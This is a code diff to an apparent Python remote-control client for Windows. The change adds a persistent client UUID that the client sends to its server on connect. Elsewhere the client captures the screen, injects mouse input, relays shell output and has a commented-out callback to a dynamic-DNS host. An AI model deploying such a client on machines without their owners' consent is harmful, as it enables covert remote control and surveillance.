@@ -16,11 +16,12 @@ from base64 import b64encode, b64decode
 from _winapi import PeekNamedPipe, ReadFile
 from dxcampil import create as create_camera
 
-from packets import *
+from libs.packets import *
 
 config_data = {}
 DEFAULT_HOST = "127.0.0.1"  # "cfc8522bc8db.ofalias.net"
 DEFAULT_PORT = 10616
+DEFAULT_UUID = hex(int.from_bytes(random.randbytes(8), "big"))[2:]
 FILE_BLOCK = 1024 * 100
 reconnect_time = 2
 
@@ -38,13 +39,21 @@ def load_config() -> None:
             return
         except OSError:
             pass
-    config_data = {"host": DEFAULT_HOST, "port": DEFAULT_PORT}
+    config_data = {"host": DEFAULT_HOST,
+                   "port": DEFAULT_PORT,
+                   "uuid": DEFAULT_UUID}
+    try:
+        with open(config_path, "w+") as f:
+            f.write(json.dumps(config_data))
+    except OSError:
+        pass
 
 
 class Client:
     def __init__(self, config: dict) -> None:
         self.host = config.get("host") if config.get("host") else DEFAULT_HOST
         self.port = config.get("port") if config.get("port") else DEFAULT_PORT
+        self.uuid = config.get("uuid") if config.get("uuid") else DEFAULT_UUID
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.mouse_key_map = {
             "left": (win32con.MOUSEEVENTF_LEFTDOWN, win32con.MOUSEEVENTF_LEFTUP),
@@ -98,6 +107,7 @@ class Client:
         print("开始尝试连接至服务器")
         self.connect_until()
         self.log("成功连接至服务器!")
+        self.sock.sendall(int(self.uuid, 16).to_bytes(8, "big"))
         start_and_return(self.shell_output_thread)
         self.threads.append(start_and_return(self.log_send_thread))
         self.threads.append(start_and_return(self.packet_send_thread))
